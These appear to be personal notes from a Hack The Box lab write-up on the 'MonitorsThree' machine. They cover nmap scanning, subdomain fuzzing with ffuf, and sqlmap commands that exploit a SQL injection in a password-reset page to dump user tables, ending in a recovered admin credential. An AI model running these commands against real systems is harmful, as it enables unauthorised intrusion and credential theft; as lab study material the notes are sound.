#### nmap

Service scan
```bash
sudo nmap -sC -sV 10.10.11.30 -oA nmap -v
```
![[Pasted image 20241014183753.png]]

#### manual

Subdomain enumeration
```bash
ffuf -u http://monitorsthree.htb -H "Host: FUZZ.monitorsthree.htb" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -fc 200
```
![[Pasted image 20241014191937.png]]

Added entries to /etc/hosts
```
10.10.11.30 monitorsthree.htb cacti.monitorsthree.htb
```

![[Pasted image 20241014192017.png]]

On http://monitorsthree.htb/forgot_password.php there's an SQL injection possible. Tested it by entering `%27` in username field.

Using sqlmap
```bash
sqlmap -r r.txt --risk=3 --level=5 --dbs 
```
![[Pasted image 20241014202917.png]]

```bash
sqlmap -r r.txt --risk=3 --level=5 -D monitorsthree_db --tables
```
![[Pasted image 20241014202944.png]]

```bash
sqlmap -r r.txt --risk=3 --level=5 -D monitorsthree_db -T users -C username,password --dump
```
![[Pasted image 20241014203017.png]]
![[Pasted image 20241014203054.png]]
`admin:greencacti2001`

